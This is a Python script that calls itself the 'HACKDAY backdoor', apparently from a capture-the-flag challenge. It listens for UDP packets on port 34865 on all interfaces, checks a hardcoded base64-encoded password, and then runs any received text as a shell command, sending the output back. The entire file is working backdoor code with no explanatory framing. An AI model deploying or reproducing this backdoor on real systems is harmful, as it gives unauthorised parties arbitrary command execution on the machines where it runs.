#!/usr/bin/python3
from asyncio.subprocess import PIPE
import base64
import socket
import subprocess
import time

LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 34865
BUFFER_SIZE = 65507
PASSWORD = 'hackday'

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((LISTEN_IP,LISTEN_PORT))
    except Exception:
        quit()

    ip_list = []

    while True:
        try:
            data, addr =  sock.recvfrom(BUFFER_SIZE)

            if isBase64(data):
                if isUTF8(base64.b64decode(data)):
                    if base64.b64decode(data).decode('utf8') == PASSWORD and addr not in ip_list:
                        auth = base64.b64encode(b"You are now authentified. Welcome on HACKDAY backdoor ! Hope you are verry fast ;)")
                        sock.sendto(auth, addr)
                        ip_list.append(addr)
                        timing = time.time()
                        continue

                    if addr not in ip_list:
                        auth = base64.b64encode(b"You are not authorized. Send password")
                        sock.sendto(auth, addr)
                    
                    else : 
                        if time.time() - timing > 1 :
                            ip_list = []
                            timing = time.time()
                            message = base64.b64encode(b"Not fast enought")
                            sock.sendto(message, addr)
                            continue

                        command = base64.b64decode(data).decode('utf8')
                        p = subprocess.Popen(command,shell=True,stdin=PIPE,stdout=PIPE)

                        time_limit = 2
                        timer = 0
                        time_gap = 0.2  

                        ended = False
                        while True:
                            time.sleep(time_gap)
                            returncode = p.poll()
                            timer += time_gap
                            if timer >= time_limit:
                                p.kill()
                                break
                            if returncode is not None:
                                ended = True
                                break

                        if ended :
                            out, err = p.communicate()
                            result = base64.b64encode(out)
                            sock.sendto(result, addr)
                        else:
                            error = base64.b64encode(b"Do not use interactive commands")
                            sock.sendto(error, addr)

                else : #utf8
                    auth = base64.b64encode(b"You are not authorized.")
                    sock.sendto(auth, addr)
                    continue

            else : #base64
                auth = base64.b64encode(b"You are not authorized.")
                sock.sendto(auth, addr)


            

            
                    
        except Exception as e:
            pass


def isBase64(s):
    try:
        return base64.b64encode(base64.b64decode(s)) == s
    except Exception:
        return False

def isUTF8(s):
    try:
        s.decode('utf8')
        return True
    except Exception:
        return False
        


if __name__=="__main__":
    main()